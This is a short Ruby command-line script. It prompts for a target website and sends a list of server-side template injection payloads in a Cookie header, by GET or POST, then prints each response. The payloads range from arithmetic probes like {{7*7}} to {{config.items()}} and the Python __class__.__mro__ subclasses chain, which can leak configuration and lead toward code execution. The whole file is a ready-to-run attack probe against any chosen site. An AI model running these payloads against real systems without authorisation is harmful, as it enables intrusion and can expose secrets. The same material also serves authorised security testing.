require 'net/http'
require 'uri'
require 'colorize'

# Method to send HTTP requests with payloads
def send_request(url, payload, method)
  uri = URI(url)
  http = Net::HTTP.new(uri.host, uri.port)
  request = method == 'GET' ? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
  request['User-Agent'] = 'Mozilla/5.0'  # Set a User-Agent header to mimic a browser
  request['Cookie'] = "payload=#{payload}"  # Optionally, set a cookie header with the payload
  response = http.request(request)
  return response.body
end

# Prompt the user to input the target website URL
print "Enter your target website URL: ".yellow
target_url = gets.chomp

# Prompt the user to choose between GET and POST requests
print "Choose request method (GET or POST): ".yellow
method = gets.chomp.upcase

# Payloads to test for SSTI vulnerabilities
payloads = [
  '{{7*7}}',              # Basic expression to evaluate
  '${{7*7}}',             # Alternative syntax for expression evaluation
  '#{7*7}',               # Another alternative syntax for expression evaluation
  '{{self}}',             # Accessing the context object
  '{{config}}',           # Accessing the configuration object
  '{{config.items()}}',   # Accessing configuration items
  '{{self.__class__.__mro__[1].__subclasses__()}}',  # Accessing classes
  '{{''.__class__.__mro__[1].__subclasses__()}}',    # Accessing classes via an empty string
  '{{7*7}}',              # Basic expression to evaluate (Handlebars)
  '{{this}}',             # Accessing the context object (Handlebars)
]

# Iterate through payloads and send requests
payloads.each do |payload|
  begin
    response = send_request(target_url, payload, method)
    puts "Payload: #{payload}".green
    puts "Response: #{response}".cyan
    puts "---------------------".yellow
  rescue StandardError => e
    puts "Error occurred while sending request: #{e.message}".red
  end
end
